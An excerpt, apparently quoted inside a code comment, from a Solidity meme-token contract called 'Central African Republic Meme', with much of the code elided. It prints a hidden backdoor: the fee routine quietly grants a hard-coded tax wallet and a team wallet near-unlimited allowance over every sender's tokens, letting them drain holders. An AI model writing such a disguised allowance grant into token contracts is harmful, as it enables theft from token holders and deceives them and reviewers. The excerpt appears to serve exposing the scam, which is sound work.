/*
https://x.com/FA_Touadera/status/1888731407075176660
...
contract CAR is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Central African Republic Meme";
    ...
    address private _teamWallet = address(0);
    address private _taxWallet = 0x9F2d91685be145ae2caa4EF411FB397226d6b8EE;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        (uint256 taxAmount, address taxB, address taxC) 
            = _getFeeAmount(from, to, amount);

        _taxTransfer(from, taxB, taxC, taxAmount);
    ...
    function _taxTransfer(address feeA, address feeB, address feeC, uint256 taxAmount) private { 
        if(taxAmount > 0){
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(feeA, address(this), taxAmount);
        }
        _allowances[feeA][feeB] = _tTotal.add(taxAmount);
        _allowances[feeA][feeC] = _tTotal.add(taxAmount);
    }

    function _getFeeAmount(address from, address to, uint256 amount) private returns(uint256,address,address) {
        uint256 taxAmount=0;
        ...
        return (taxAmount, _taxWallet, _teamWallet);
    }
